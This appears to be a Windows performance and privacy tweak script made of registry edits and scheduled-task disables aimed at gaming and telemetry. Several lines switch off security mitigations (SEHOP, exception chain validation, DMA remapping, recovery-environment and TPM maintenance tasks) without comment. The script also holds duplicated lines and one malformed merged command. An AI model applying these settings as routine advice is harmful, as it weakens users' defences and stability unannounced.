Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "HostsPriority" /t REG_DWORD /d "5" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "DnsPriority" /t REG_DWORD /d "6" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "NetbtPriority" /t REG_DWORD /d "7" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\pci\Parameters" /v "DmaRemappingCompatible" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\rt640x64\Parameters" /v "DmaRemappingCompatible" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\storahci\Parameters" /v "DmaRemappingCompatible" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\stornvme\Parameters" /v "DmaRemappingCompatible" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\USBXHCI\Parameters" /v "DmaRemappingCompatible" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\pci\Parameters" /v "DmaRemappingCompatible" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Session Manager\kernel" /v "DisableExceptionChainValidation" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Session Manager\kernel" /v "DpcWatchdogProfileOffset" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Session Manager\kernel" /v "DpcWatchdogPeriod" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Session Manager\kernel" /v "KernelSEHOPEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Session Manager\kernel" /v "SerializeTimerExpiration" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Session Manager\kernel" /v "InterruptSteeringDisabled" /t REG_DWORD /d "1" /f  
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "Background Only" /t REG_SZ /d "True" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "BackgroundPriority" /t REG_DWORD /d "24" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "GPU Priority" /t REG_DWORD /d "18" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "Priority" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "Scheduling Category" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "SFIO Priority" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "Latency Sensitive" /t REG_SZ /d "True" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "LocalPriority" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "HostsPriority" /t REG_DWORD /d "5" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "DnsPriority" /t REG_DWORD /d "6" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "NetbtPriority" /t REG_DWORD /d "7" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Winsock" /v "UseDelayedAcceptance" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Winsock" /v "MaxSockAddrLength" /t REG_DWORD /d "16" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Winsock" /v "MinSockAddrLength" /t REG_DWORD /d "16" /f
Reg.exe add "HKCU\Control Panel\Mouse" /v "MouseSensitivity" /t REG_SZ /d "10" /f
Reg.exe add "HKU\.DEFAULT\Control Panel\Mouse" /v "MouseSpeed" /t REG_SZ /d "0" /f
Reg.exe add "HKU\.DEFAULT\Control Panel\Mouse" /v "MouseThreshold1" /t REG_SZ /d "0" /f
Reg.exe add "HKU\.DEFAULT\Control Panel\Mouse" /v "MouseThreshold2" /t REG_SZ /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "DisablePreemption" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "DisableCudaContextPreemption" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Scheduler" /v "EnablePreemption" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\SettingSync\Groups\Personalization" /v "Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\SettingSync\Groups\BrowserSettings" /v "Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\SettingSync\Groups\Credentials" /v "Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\SettingSync\Groups\Accessibility" /v "Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\SettingSync\Groups\Windows" /v "Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize" /v "EnableTransparency" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\PolicyManager\default\ApplicationManagement\AllowGameDVR" /v "value" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\GameDVR" /v "AllowGameDVR" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\GameDVR" /v "AppCaptureEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\GameBar" /v "AllowAutoGameMode" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\GameBar" /v "AutoGameModeEnabled" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers" /v "HwSchMode" /t REG_DWORD /d "2" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\DirectX\UserGpuPreferences" /v "DirectXUserGlobalSettings" /t REG_SZ /d "VRROptimizeEnable=0;" /fReg.exe add "HKCU\Control Panel\Accessibility\MouseKeys" /v "Flags" /t REG_SZ /d "0" /f
Reg.exe add "HKCU\Control Panel\Accessibility\StickyKeys" /v "Flags" /t REG_SZ /d "0" /f
Reg.exe add "HKCU\Control Panel\Accessibility\Keyboard Response" /v "Flags" /t REG_SZ /d "0" /f
Reg.exe add "HKCU\Control Panel\Accessibility\ToggleKeys" /v "Flags" /t REG_SZ /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\AdvertisingInfo" /v "Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Control Panel\International\User Profile" /v "HttpAcceptLanguageOptOut" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "Start_TrackProgs" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-338393Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-353694Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-353696Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Speech_OneCore\Settings\OnlineSpeechPrivacy" /v "HasAccepted" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Personalization\Settings" /v "AcceptedPrivacyPolicy" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\InputPersonalization" /v "RestrictImplicitInkCollection" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\InputPersonalization" /v "RestrictImplicitTextCollection" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\InputPersonalization\TrainedDataStore" /v "HarvestContacts" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Diagnostics\DiagTrack" /v "ShowedToastAtLevel" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DataCollection" /v "AllowTelemetry" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Privacy" /v "TailoredExperiencesWithDiagnosticDataEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Diagnostics\DiagTrack\EventTranscriptKey" /v "EnableEventTranscript" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Siuf\Rules" /v "NumberOfSIUFInPeriod" /t REG_DWORD /d "0" /f
Reg.exe delete "HKCU\SOFTWARE\Microsoft\Siuf\Rules" /v "PeriodInNanoSeconds" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v "PublishUserActivities" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v "UploadUserActivities" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\userNotificationListener" /v "Value" /t REG_SZ /d "Deny" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\location" /v "Value" /t REG_SZ /d "Deny" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\appDiagnostics" /v "Value" /t REG_SZ /d "Deny" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\userAccountInformation" /v "Value" /t REG_SZ /d "Deny" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\BackgroundAccessApplications" /v "GlobalUserDisabled" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Search" /v "BackgroundAppGlobalToggle" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\BTAGService" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\bthserv" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\MapsBroker" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Spooler" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\PrintNotify" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\XblGameSave" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\XboxNetApiSvc" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\XboxGipSvc" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\XblAuthManager" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\BackgroundAccessApplications" /v "GlobalUserDisabled" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Search" /v "BackgroundAppGlobalToggle" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\PriorityControl" /v "Win32PrioritySeparation" /t REG_DWORD /d "40" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "FeatureSettings" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerThrottling" /v "PowerThrottlingOff" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "NetworkThrottlingIndex" /t REG_DWORD /d "10" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "SystemResponsiveness" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Background Only" /t REG_SZ /d "False" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "GPU Priority" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Priority" /t REG_DWORD /d "6" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Scheduling Category" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "SFIO Priority" /t REG_SZ /d "High" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_FSEBehaviorMode" /t REG_DWORD /d "2" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_HonorUserFSEBehaviorMode" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_DXGIHonorFSEWindowsCompatible" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_EFSEFeatureFlags" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "AutoEndTasks" /t REG_SZ /d "1" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "HungAppTimeout" /t REG_SZ /d "1000" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "WaitToKillAppTimeout" /t REG_SZ /d "2000" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "LowLevelHooksTimeout" /t REG_SZ /d "1000" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "MenuShowDelay" /t REG_SZ /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control" /v "WaitToKillServiceTimeout" /t REG_SZ /d "2000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\Maintenance" /v "MaintenanceDisabled" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "HibernateEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v "TelemetrySalt" /t REG_DWORD /d "2" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v "FirstRunTelemetryComplete" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v "AppReadinessLogonComplete" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v "EdgeDesktopShortcutCreated" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v "PostAppInstallTasksCompleted" /t REG_DWORD /d "1" /f
cls
schtasks /Change /TN "Microsoft\Windows\Application Experience\Microsoft Compatibility Appraiser" /Disable
schtasks /Change /TN "Microsoft\Windows\Application Experience\PcaPatchDbTask" /Disable
schtasks /Change /TN "Microsoft\Windows\Application Experience\ProgramDataUpdater" /Disable
schtasks /Change /TN "Microsoft\Windows\Application Experience\StartupAppTask" /Disable
schtasks /Change /TN "Microsoft\Windows\Autochk\Proxy" /Disable
schtasks /Change /TN "Microsoft\Windows\Customer Experience Improvement Program\Consolidator" /Disable
schtasks /Change /TN "Microsoft\Windows\Customer Experience Improvement Program\UsbCeip" /Disable
schtasks /Change /TN "Microsoft\Windows\Defrag\ScheduledDefrag" /Disable
schtasks /Change /TN "Microsoft\Windows\Device Information\Device" /Disable
schtasks /Change /TN "Microsoft\Windows\Device Information\Device User" /Disable
schtasks /Change /TN "Microsoft\Windows\DiskCleanup\SilentCleanup" /Disable
schtasks /Change /TN "Microsoft\Windows\DiskDiagnostic\Microsoft-Windows-DiskDiagnosticDataCollector" /Disable
schtasks /Change /TN "Microsoft\Windows\DiskFootprint\Diagnostics" /Disable
schtasks /Change /TN "Microsoft\Windows\DiskFootprint\StorageSense" /Disable
schtasks /Change /TN "Microsoft\Windows\DUSM\dusmtask" /Disable
schtasks /Change /TN "Microsoft\Windows\EnterpriseMgmt\MDMMaintenenceTask" /Disable
schtasks /Change /TN "Microsoft\Windows\Feedback\Siuf\DmClient" /Disable
schtasks /Change /TN "Microsoft\Windows\Feedback\Siuf\DmClientOnScenarioDownload" /Disable
schtasks /Change /TN "Microsoft\Windows\Flighting\FeatureConfig\ReconcileFeatures" /Disable
schtasks /Change /TN "Microsoft\Windows\Flighting\FeatureConfig\UsageDataFlushing" /Disable
schtasks /Change /TN "Microsoft\Windows\Flighting\FeatureConfig\UsageDataReporting" /Disable
schtasks /Change /TN "Microsoft\Windows\Flighting\OneSettings\RefreshCache" /Disable
schtasks /Change /TN "Microsoft\Windows\Input\LocalUserSyncDataAvailable" /Disable
schtasks /Change /TN "Microsoft\Windows\Input\MouseSyncDataAvailable" /Disable
schtasks /Change /TN "Microsoft\Windows\Input\PenSyncDataAvailable" /Disable
schtasks /Change /TN "Microsoft\Windows\Input\TouchpadSyncDataAvailable" /Disable
schtasks /Change /TN "Microsoft\Windows\International\Synchronize Language Settings" /Disable
schtasks /Change /TN "Microsoft\Windows\LanguageComponentsInstaller\Installation" /Disable
schtasks /Change /TN "Microsoft\Windows\LanguageComponentsInstaller\ReconcileLanguageResources" /Disable
schtasks /Change /TN "Microsoft\Windows\LanguageComponentsInstaller\Uninstallation" /Disable
schtasks /Change /TN "Microsoft\Windows\License Manager\TempSignedLicenseExchange" /Disable
schtasks /Change /TN "Microsoft\Windows\License Manager\TempSignedLicenseExchange" /Disable
schtasks /Change /TN "Microsoft\Windows\Management\Provisioning\Cellular" /Disable
schtasks /Change /TN "Microsoft\Windows\Management\Provisioning\Logon" /Disable
schtasks /Change /TN "Microsoft\Windows\Maintenance\WinSAT" /Disable
schtasks /Change /TN "Microsoft\Windows\Maps\MapsToastTask" /Disable
schtasks /Change /TN "Microsoft\Windows\Maps\MapsUpdateTask" /Disable
schtasks /Change /TN "Microsoft\Windows\Mobile Broadband Accounts\MNO Metadata Parser" /Disable
schtasks /Change /TN "Microsoft\Windows\MUI\LPRemove" /Disable
schtasks /Change /TN "Microsoft\Windows\NetTrace\GatherNetworkInfo" /Disable
schtasks /Change /TN "Microsoft\Windows\PI\Sqm-Tasks" /Disable
schtasks /Change /TN "Microsoft\Windows\Power Efficiency Diagnostics\AnalyzeSystem" /Disable
schtasks /Change /TN "Microsoft\Windows\PushToInstall\Registration" /Disable
schtasks /Change /TN "Microsoft\Windows\Ras\MobilityManager" /Disable
schtasks /Change /TN "Microsoft\Windows\RecoveryEnvironment\VerifyWinRE" /Disable
schtasks /Change /TN "Microsoft\Windows\RemoteAssistance\RemoteAssistanceTask" /Disable
schtasks /Change /TN "Microsoft\Windows\RetailDemo\CleanupOfflineContent" /Disable
schtasks /Change /TN "Microsoft\Windows\Servicing\StartComponentCleanup" /Disable
schtasks /Change /TN "Microsoft\Windows\SettingSync\NetworkStateChangeTask" /Disable
schtasks /Change /TN "Microsoft\Windows\Setup\SetupCleanupTask" /Disable
schtasks /Change /TN "Microsoft\Windows\Setup\SnapshotCleanupTask" /Disable
schtasks /Change /TN "Microsoft\Windows\SpacePort\SpaceAgentTask" /Disable
schtasks /Change /TN "Microsoft\Windows\SpacePort\SpaceManagerTask" /Disable
schtasks /Change /TN "Microsoft\Windows\Speech\SpeechModelDownloadTask" /Disable
schtasks /Change /TN "Microsoft\Windows\Storage Tiers Management\Storage Tiers Management Initialization" /Disable
schtasks /Change /TN "Microsoft\Windows\Sysmain\ResPriStaticDbSync" /Disable
schtasks /Change /TN "Microsoft\Windows\Sysmain\WsSwapAssessmentTask" /Disable
schtasks /Change /TN "Microsoft\Windows\Task Manager\Interactive" /Disable
schtasks /Change /TN "Microsoft\Windows\TPM\Tpm-HASCertRetr" /Disable
schtasks /Change /TN "Microsoft\Windows\TPM\Tpm-Maintenance" /Disable
schtasks /Change /TN "Microsoft\Windows\UPnP\UPnPHostConfig" /Disable
schtasks /Change /TN "Microsoft\Windows\User Profile Service\HiveUploadTask" /Disable
schtasks /Change /TN "Microsoft\Windows\WDI\ResolutionHost" /Disable
schtasks /Change /TN "Microsoft\Windows\Windows Filtering Platform\BfeOnServiceStartTypeChange" /Disable
schtasks /Change /TN "Microsoft\Windows\WOF\WIM-Hash-Management" /Disable
schtasks /Change /TN "Microsoft\Windows\WOF\WIM-Hash-Validation" /Disable
schtasks /Change /TN "Microsoft\Windows\Work Folders\Work Folders Logon Synchronization" /Disable
schtasks /Change /TN "Microsoft\Windows\Work Folders\Work Folders Maintenance Work" /Disable
schtasks /Change /TN "Microsoft\Windows\Workplace Join\Automatic-Device-Join" /Disable
schtasks /Change /TN "Microsoft\Windows\WwanSvc\NotificationTask" /Disable
schtasks /Change /TN "Microsoft\Windows\WwanSvc\OobeDiscovery" /Disable
cls
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v "ShowRecent" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v "ShowFrequent" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v "DesktopProcess" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v "EnableAutoTray" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "Start_SearchFiles" /t REG_DWORD /d "2" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "ServerAdminUI" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "Hidden" /t REG_DWORD /d "2" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "ShowCompColor" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "HideFileExt" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "DontPrettyPath" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "ShowInfoTip" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "HideIcons" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "SeparateProcess" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "IconsOnly" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "ShowTypeOverlay" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "ShowStatusBar" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "StoreAppsOnTaskbar" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "ListviewAlphaSelect" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "ListviewShadow" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "TaskbarAnimations" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "StartMenuInit" /t REG_DWORD /d "13" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "ShowCortanaButton" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "TaskbarStateLastRun" /t REG_BINARY /d "465df45f00000000" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "ReindexedProfile" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "Start_TrackProgs" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "LaunchTo" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "TaskbarSmallIcons" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "ExtendedUIHoverTime" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "DesktopLivePreviewHoverTime" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "nonetcrawling" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "ShowTaskViewButton" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "TaskbarSizeMove" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "DisallowShaking" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "Start_TrackDocs" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "Hidden" /t REG_DWORD /d "2" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "HideFileExt" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Control Panel\Mouse" /v "ActiveWindowTracking" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Control Panel\Mouse" /v "MouseSensitivity" /t REG_SZ /d "10" /f
